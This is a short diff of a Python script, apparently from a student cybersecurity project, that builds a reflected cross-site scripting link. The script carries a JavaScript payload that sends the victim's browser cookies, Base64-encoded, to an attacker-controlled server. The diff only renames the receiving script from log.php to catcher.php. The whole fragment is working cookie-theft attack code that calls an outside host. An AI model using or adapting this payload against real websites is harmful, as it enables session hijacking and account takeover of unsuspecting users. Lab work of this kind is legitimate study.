@@ -8,7 +8,7 @@ TARGET_URL = f"http://{TARGET_IP}/CyberProject/home.php"
 ATTACKER_IP = "192.168.56.1"
 
 # The Payload: stealing cookies and sending them to log.php
-js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/AttackerServer/log.php?data=' + btoa(document.cookie);</script>" # btoa - a function that encodes a string to Base64 to hide the cookies
+js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + btoa(document.cookie);</script>" # btoa - a function that encodes a string to Base64 to hide the cookies
 
 encoded_payload = urllib.parse.quote(js_payload)
 malicious_link = f"{TARGET_URL}?msg={encoded_payload}"
